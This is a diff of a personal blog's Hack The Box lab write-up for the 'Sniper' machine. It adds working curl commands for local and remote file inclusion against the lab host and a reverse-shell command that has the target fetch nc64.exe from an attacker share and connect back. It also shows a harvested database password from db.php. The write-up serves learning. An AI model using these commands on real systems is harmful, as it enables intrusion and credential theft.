@@ -66,7 +66,83 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 /Images               (Status: 301) [Size: 150] [--&gt; http://10.10.10.151/Images/]
 /css                  (Status: 301) [Size: 147] [--&gt; http://10.10.10.151/css/]
 /js                   (Status: 301) [Size: 146] [--&gt; http://10.10.10.151/js/]
-</code></pre><h2 id=foothold>Foothold</h2><ul><li><code>/blog</code></li></ul><p><img src=./images/2.png alt></p><h2 id=user>User</h2><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><h2 id=foothold>Foothold</h2><ul><li><code>/blog</code></li></ul><p><img src=./images/2.png alt></p><ul><li>It looks like we have a <code>LFI</code></li></ul><pre tabindex=0><code>└─$ curl &#39;http://10.10.10.151/blog/?lang=\Windows\System32\drivers\etc\hosts&#39;
+
+&lt;html&gt;
+...
+&lt;/html&gt;
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a &#39;#&#39; symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#       127.0.0.1       localhost
+#       ::1             localhost
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><ul><li>And <code>RFI</code></li></ul><p><img src=./images/4.png alt></p><ul><li>Let&rsquo;s try <code>RFI</code></li></ul><pre tabindex=0><code>└─$ curl &#39;http://10.10.10.151/blog/?lang=\\10.10.16.9\share\shell.php&amp;cmd=whoami&#39;
+...
+&lt;/html&gt;
+nt authority\iusr
+&lt;/body&gt;
+&lt;/html&gt;
+****
+</code></pre><ul><li>Let&rsquo;s get reverse shell</li></ul><pre tabindex=0><code>└─$ curl &#39;http://10.10.10.151/blog/?lang=\\10.10.16.9\share\shell.php&amp;cmd=\\10.10.16.9\share\nc64.exe+10.10.16.9+6666+-e+cmd.exe&#39;
+</code></pre><pre tabindex=0><code>└─$ nc -vlnp 6666                                                                               
+listening on [any] 6666 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.10.151] 49678
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\blog&gt;
+</code></pre><h2 id=user>User</h2><ul><li><code>C:\inetpub\wwwroot\</code> has <code>user</code> folder</li></ul><pre tabindex=0><code>PS C:\inetpub\wwwroot\user&gt; dir
+dir
+
+
+    Directory: C:\inetpub\wwwroot\user
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        4/11/2019   5:52 AM                css                                                                   
+d-----        4/11/2019   5:23 AM                fonts                                                                 
+d-----        4/11/2019   5:23 AM                images                                                                
+d-----        4/11/2019   5:23 AM                js                                                                    
+d-----        4/11/2019   5:23 AM                vendor                                                                
+-a----        4/11/2019   5:15 PM            108 auth.php                                                              
+-a----        4/11/2019  10:51 AM            337 db.php                                                                
+-a----        4/11/2019   6:18 AM           4639 index.php                                                             
+-a----        4/11/2019   6:10 AM           6463 login.php                                                             
+-a----         4/8/2019  11:04 PM            148 logout.php                                                            
+-a----        10/1/2019   8:42 AM           7192 registration.php                                                      
+-a----        8/14/2019  10:35 PM           7004 registration_old123123123847.php
+</code></pre><ul><li><code>db.php</code> has creds</li></ul><pre tabindex=0><code>PS C:\inetpub\wwwroot\user&gt; type db.php
+type db.php
+&lt;?php
+// Enter your Host, username, password, database below.
+// I left password empty because i do not set password on localhost.
+$con = mysqli_connect(&#34;localhost&#34;,&#34;dbuser&#34;,&#34;36mEAhz/B8xQ~2VM&#34;,&#34;sniper&#34;);
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo &#34;Failed to connect to MySQL: &#34; . mysqli_connect_error();
+  }
+?&gt;
+</code></pre><ul><li>We can try the creds as <code>Chris</code> user</li></ul><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fsniper%2f&text=%5bHTB%5d%20Machine%3a%20Sniper&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fsniper%2f&title=%5bHTB%5d%20Machine%3a%20Sniper" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fsniper%2f&title=%5bHTB%5d%20Machine%3a%20Sniper" target=_blank><i class="fab fa-linkedin"></i></a>
